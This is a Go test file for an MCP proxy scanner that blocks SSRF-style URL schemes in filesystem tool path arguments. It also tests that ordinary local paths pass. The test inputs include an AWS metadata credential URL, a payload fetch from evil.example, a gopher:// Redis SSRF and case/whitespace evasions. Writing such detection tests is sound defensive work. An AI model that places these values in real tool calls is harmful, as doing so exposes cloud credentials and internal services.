package mcp

import (
	"strings"
	"testing"
)

// TestHandleToolCall_SchemeHijack_BlocksEndToEnd drives the full live proxy
// entry point (HandleToolCall) to prove an SSRF scheme-hijack in a filesystem
// tool argument is blocked on the real tools/call path an IDE hook exercises.
func TestHandleToolCall_SchemeHijack_BlocksEndToEnd(t *testing.T) {
	h, buf := newHintTestHandler() // default-AUDIT policy; read_file is not pre-blocked

	msg := &Message{
		JSONRPC: "2.0",
		ID:      mustRequestID(t),
		Method:  MethodToolsCall,
		Params: mustMarshal(t, CallToolParams{
			Name: "read_file",
			Arguments: map[string]interface{}{
				"path": "http://169.254.169.254/latest/meta-data/iam/security-credentials/default",
			},
		}),
	}

	blocked, _ := h.HandleToolCall(msg)
	if !blocked {
		t.Fatal("read_file with an IMDS http:// path must be BLOCKED on the live HandleToolCall path")
	}
	out := buf.String()
	if !strings.Contains(out, "scheme-hijack") {
		t.Errorf("expected scheme-hijack block reason in stderr, got:\n%s", out)
	}
	if !strings.Contains(out, "scheme=http") {
		t.Errorf("expected scheme=http in stderr, got:\n%s", out)
	}
}

// ScanFilesystemSchemeHijack — a filesystem tool's path argument must be a local
// path, never a remote URL. A network scheme there coerces the server into an
// outbound request (SSRF) or a remote fetch the agent trusts as a local file.

func TestSchemeHijack_ReadFile_IMDS(t *testing.T) {
	res := ScanFilesystemSchemeHijack("read_file", map[string]interface{}{
		"path": "http://169.254.169.254/latest/meta-data/iam/security-credentials/default",
	})
	if !res.Blocked {
		t.Fatalf("read_file with IMDS http URL must block: %+v", res.Findings)
	}
	if res.Findings[0].Scheme != "http" {
		t.Errorf("expected scheme http, got %q", res.Findings[0].Scheme)
	}
}

func TestSchemeHijack_ReadFile_RemotePayload(t *testing.T) {
	res := ScanFilesystemSchemeHijack("read_file", map[string]interface{}{
		"path": "https://evil.example/payload.sh",
	})
	if !res.Blocked {
		t.Fatalf("read_file with https remote payload must block: %+v", res.Findings)
	}
}

func TestSchemeHijack_ReadFile_LocalhostInternalService(t *testing.T) {
	res := ScanFilesystemSchemeHijack("read_file", map[string]interface{}{
		"path": "http://localhost:8080/admin/dump",
	})
	if !res.Blocked {
		t.Fatalf("read_file reaching an internal service must block: %+v", res.Findings)
	}
}

func TestSchemeHijack_CopyFile_SourceFTP(t *testing.T) {
	// The scheme can hide in any path-shaped argument key (source/destination/...).
	res := ScanFilesystemSchemeHijack("copy_file", map[string]interface{}{
		"source": "ftp://evil.example/x", "destination": "/tmp/y",
	})
	if !res.Blocked {
		t.Fatalf("copy_file with ftp source must block: %+v", res.Findings)
	}
	if res.Findings[0].ArgName != "source" {
		t.Errorf("expected finding on source arg, got %q", res.Findings[0].ArgName)
	}
}

func TestSchemeHijack_Gopher_RedisSSRF(t *testing.T) {
	res := ScanFilesystemSchemeHijack("read_file", map[string]interface{}{
		"path": "gopher://127.0.0.1:6379/_INFO",
	})
	if !res.Blocked {
		t.Fatalf("gopher SSRF must block: %+v", res.Findings)
	}
}

func TestSchemeHijack_CaseInsensitiveAndWhitespace(t *testing.T) {
	for _, v := range []string{"HTTP://evil.example/x", "  https://evil.example/x"} {
		res := ScanFilesystemSchemeHijack("read_file", map[string]interface{}{"path": v})
		if !res.Blocked {
			t.Fatalf("scheme evasion via case/whitespace must block (%q): %+v", v, res.Findings)
		}
	}
}

// --- Realistic developer-workflow TNs ---------------------------------------

func TestSchemeHijack_TN_LocalPaths(t *testing.T) {
	// Ordinary local reads/writes — must never block.
	cases := []struct{ tool, arg, val string }{
		{"read_file", "path", "/workspace/project/README.md"},
		{"read_file", "path", "./src/http_client.go"},      // "http" in filename, not a scheme
		{"read_file", "path", "/var/log/https/access.log"}, // "https" mid-path, not a scheme
		{"write_file", "path", "C:\\Users\\me\\ftp.log"},   // Windows path containing "ftp"
		{"read_file", "path", "https_config.yaml"},         // no :// — just a filename
		{"list_directory", "path", "/home/user/projects"},
		{"read_file", "path", "file:///etc/hosts"},         // file:// is a legitimate local URI
		{"read_file", "path", "s3://my-bucket/data.json"},  // cloud object store, legitimately backed
		{"read_file", "path", "gs://bucket/obj"},           // GCS object store
	}
	for _, c := range cases {
		res := ScanFilesystemSchemeHijack(c.tool, map[string]interface{}{c.arg: c.val})
		if res.Blocked {
			t.Errorf("%s(%s=%q) must NOT block: %+v", c.tool, c.arg, c.val, res.Findings)
		}
	}
}

func TestSchemeHijack_TN_NonFilesystemToolNotScanned(t *testing.T) {
	// fetch_url legitimately takes a URL; it is not a filesystem tool, so the
	// scheme scanner does not apply (its own rule families govern egress).
	res := ScanFilesystemSchemeHijack("fetch_url", map[string]interface{}{"url": "http://example.com"})
	if res.Blocked {
		t.Fatalf("non-filesystem tool must not be scanned: %+v", res.Findings)
	}
}

func TestSchemeHijack_TN_NonPathArgIgnored(t *testing.T) {
	// A URL in a non-path argument key (e.g., an opaque option) is out of scope
	// for this filesystem-path scanner.
	res := ScanFilesystemSchemeHijack("read_file", map[string]interface{}{
		"path": "/etc/hosts", "encoding_url_doc": "https://example.com/spec",
	})
	if res.Blocked {
		t.Fatalf("URL in a non-path argument must not block: %+v", res.Findings)
	}
}
